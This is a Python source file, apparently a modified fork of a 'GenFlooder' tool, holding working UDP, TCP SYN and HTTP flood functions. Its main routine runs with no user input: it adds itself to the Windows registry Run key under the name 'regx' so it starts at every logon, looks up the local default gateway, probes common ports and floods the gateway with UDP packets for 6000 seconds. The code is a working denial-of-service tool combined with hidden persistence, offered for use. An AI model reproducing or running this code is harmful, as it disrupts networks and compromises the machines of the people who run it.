import os
import socket
import threading
import time
import random
import sys
import requests
import colorama
from colorama import Fore
import aiohttp
import asyncio
import subprocess
import re
import winreg

colorama.init(autoreset=True)

# def display_banner(): 
#     banner_text = f"""
# {Fore.LIGHTYELLOW_EX}
#  .d8888b.                    8888888888 888                        888                  
# d88P  Y88b                   888        888                        888                  
# 888    888                   888        888                        888                  
# 888         .d88b.  88888b.  8888888    888  .d88b.   .d88b.   .d88888  .d88b.  888d888 88       88@@@@ 
# 888  88888 d8P  Y8b 888 "88b 888        888 d88""88b d88""88b d88" 888 d8P  Y8b 888P"    88     88     @
# 888    888 88888888 888  888 888        888 888  888 888  888 888  888 88888888 888       88   88      @ 
# Y88b  d88P Y8b.     888  888 888        888 Y88..88P Y88..88P Y88b 888 Y8b.     888        88 88      @
#  "Y8888P88  "Y8888  888  888 888        888  "Y88P"   "Y88P"   "Y88888  "Y8888  888         88    @@@@@@@@
                                                                                        
#                           {Fore.LIGHTRED_EX}UDP DoS | TCP SYN | HTTP Flood
#                           Author: {Fore.LIGHTGREEN_EX}GenFlooder | {Fore.LIGHTRED_EX}https://github.com/geniuszly/GenFlooder
#                           Modified by: {Fore.LIGHTGREEN_EX}TutorialsAndroid | {Fore.LIGHTRED_EX}https://github.com/TutorialsAndroid/GenFlooder
# """
#     print(banner_text)

APP_NAME = "regx"

def parse_arguments(): #Parses and validates command line arguments.
    if len(sys.argv) != 5:
        print(f"""
        {Fore.LIGHTYELLOW_EX}╭───────────────────────━━━━━━━━━━━━━━━━━━━━━───────────────────╮
        | {Fore.LIGHTGREEN_EX}Use » python {os.path.basename(__file__)} [target] [port] [duration] [attack_type] {Fore.LIGHTYELLOW_EX}| 
        | {Fore.LIGHTGREEN_EX}Type Attacks »              {Fore.LIGHTRED_EX}UDP  {Fore.LIGHTGREEN_EX}| {Fore.LIGHTRED_EX}TCP {Fore.LIGHTGREEN_EX}| {Fore.LIGHTRED_EX}HTTP                 {Fore.LIGHTYELLOW_EX}| 
        ╰───────────────────────━━━━━━━━━━━━━━━━━━━━━───────────────────╯
        """)
        sys.exit(1)
    target_ip = sys.argv[1]
    target_port = int(sys.argv[2])
    duration = int(sys.argv[3])
    attack_type = sys.argv[4].upper()
    if attack_type not in ['UDP', 'TCP', 'HTTP']:
        print("Invalid attack type. Valid values: UDP, TCP, HTTP")
        sys.exit(1)
    return target_ip, target_port, duration, attack_type

def check_target_availability(target_ip, target_port): #Checks the target's availability before starting an attack.
    try:
        socket.create_connection((target_ip, target_port), timeout=5)
        print(f"{Fore.LIGHTYELLOW_EX}[ {Fore.LIGHTRED_EX}GenFlooder {Fore.LIGHTYELLOW_EX}] {Fore.LIGHTBLUE_EX}» The target is available: {Fore.LIGHTGREEN_EX}{target_ip}:{target_port}")
        return True
    except socket.error:
        print(f"{Fore.LIGHTYELLOW_EX}[ {Fore.LIGHTRED_EX}GenFlooder {Fore.LIGHTYELLOW_EX}] {Fore.LIGHTBLUE_EX}» Target unavailable: {Fore.LIGHTRED_EX}{target_ip}:{target_port}")
        return False

def udp_attack(target_ip, target_port, duration): #Initiates a UDP attack on the specified target.
    udp_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    packet_data = random._urandom(65500)
    end_time = time.time() + duration
    packets_sent = 0

    print(f'{Fore.LIGHTYELLOW_EX}[ {Fore.LIGHTRED_EX}GenFlooder {Fore.LIGHTYELLOW_EX}] {Fore.LIGHTBLUE_EX}» UDP attack launched on {Fore.LIGHTGREEN_EX}{target_ip}:{target_port} {Fore.LIGHTBLUE_EX}на {Fore.LIGHTGREEN_EX}{duration} {Fore.LIGHTBLUE_EX}seconds.')

    while time.time() < end_time:
        udp_socket.sendto(packet_data, (target_ip, target_port))
        packets_sent += 1
    
    print(f'{Fore.LIGHTYELLOW_EX}[ {Fore.LIGHTRED_EX}GenFlooder {Fore.LIGHTYELLOW_EX}] {Fore.LIGHTBLUE_EX}» UDP attack completed. Total packets sent: {Fore.LIGHTGREEN_EX}{packets_sent}')

def tcp_syn_attack(target_ip, target_port, duration): #Initiates a TCP SYN attack on the specified target.
    end_time = time.time() + duration
    packets_sent = 0

    print(f'{Fore.LIGHTYELLOW_EX}[ {Fore.LIGHTRED_EX}GenFlooder {Fore.LIGHTYELLOW_EX}] {Fore.LIGHTBLUE_EX}» TCP SYN attack initiated on {Fore.LIGHTGREEN_EX}{target_ip}:{target_port} {Fore.LIGHTBLUE_EX}на {Fore.LIGHTGREEN_EX}{duration} {Fore.LIGHTBLUE_EX}seconds.')

    while time.time() < end_time:
        tcp_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            tcp_socket.connect((target_ip, target_port))
        except socket.error:
            pass
        tcp_socket.close()
        packets_sent += 1

    print(f'{Fore.LIGHTYELLOW_EX}[ {Fore.LIGHTRED_EX}GenFlooder {Fore.LIGHTYELLOW_EX}] {Fore.LIGHTBLUE_EX}» TCP SYN attack completed. Total connection attempts: {Fore.LIGHTGREEN_EX}{packets_sent}')

async def http_flood_attack(target_ip, target_port, duration): #Initiates an HTTP Flood attack on the specified target.
    end_time = time.time() + duration
    requests_sent = 0

    print(f'{Fore.LIGHTYELLOW_EX}[ {Fore.LIGHTRED_EX}GenFlooder {Fore.LIGHTYELLOW_EX}] {Fore.LIGHTBLUE_EX}» HTTP Flood attack started on {Fore.LIGHTGREEN_EX}{target_ip}:{target_port} {Fore.LIGHTBLUE_EX}на {Fore.LIGHTGREEN_EX}{duration} {Fore.LIGHTBLUE_EX}seconds.')

    async with aiohttp.ClientSession() as session:
        while time.time() < end_time:
            try:
                async with session.get(f"http://{target_ip}:{target_port}") as response:
                    requests_sent += 1
            except aiohttp.ClientError:
                pass

    print(f'{Fore.LIGHTYELLOW_EX}[ {Fore.LIGHTRED_EX}GenFlooder {Fore.LIGHTYELLOW_EX}] {Fore.LIGHTBLUE_EX}» HTTP Flood attack completed. Total requests sent: {Fore.LIGHTGREEN_EX}{requests_sent}')

def get_default_gateway():
    command = [
        "powershell",
        "-Command",
        "(Get-NetRoute -DestinationPrefix '0.0.0.0/0' | Sort-Object RouteMetric | Select-Object -First 1).NextHop"
    ]

    result = subprocess.run(
        command,
        capture_output=True,
        text=True
    )

    return result.stdout.strip()

def check_open_port(host, port, timeout=2):
    try:
        with socket.create_connection((host, port), timeout=timeout):
            return True
    except:
        return False
    
def add_to_startup():
    # If running as EXE, this gives EXE path.
    # If running as .py, this gives Python file path.
    app_path = sys.executable

    # If you want to run the .py file directly instead of EXE, use this:
    # app_path = f'"{sys.executable}" "{os.path.abspath(__file__)}"'

    key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"

    with winreg.OpenKey(
        winreg.HKEY_CURRENT_USER,
        key_path,
        0,
        winreg.KEY_SET_VALUE
    ) as key:
        winreg.SetValueEx(key, APP_NAME, 0, winreg.REG_SZ, app_path)

    print("Added to startup successfully.")    

if __name__ == "__main__":
    # display_banner()
    add_to_startup()
    
    gateway = get_default_gateway()
    print("Default Gateway:", gateway)
    
    selected_port = 1
    common_ports = [80, 443, 8080, 8443]
    for port in common_ports:
        if check_open_port(gateway, port):
            selected_port = port
            print(f"Open port found: {selected_port}")
            
    print("Duration in seconds: 6000 (i.e. 1.6 hour runtime)")
    print("UDP") #Always use UDP because it sends data packet quickly and does not wait to confirm everything arrived.
    
    # target_ip = input("Enter Target IP address: example:(Your Gateway IP: 192.168.0...) ")
    target_ip = gateway
    target_port = int(selected_port)
    duration = int(6000)
    attack_type = "UDP" #Always use UDP because it sends data packet quickly and does not wait to confirm everything arrived.

    if not check_target_availability(target_ip, target_port):
        sys.exit(1)
        
    # target_ip, target_port, duration, attack_type = parse_arguments()

    if not check_target_availability(target_ip, target_port):
        sys.exit(1)

    if attack_type == 'UDP':
        udp_attack(target_ip, target_port, duration)
    elif attack_type == 'TCP':
        tcp_syn_attack(target_ip, target_port, duration)
    elif attack_type == 'HTTP':
        asyncio.run(http_flood_attack(target_ip, target_port, duration))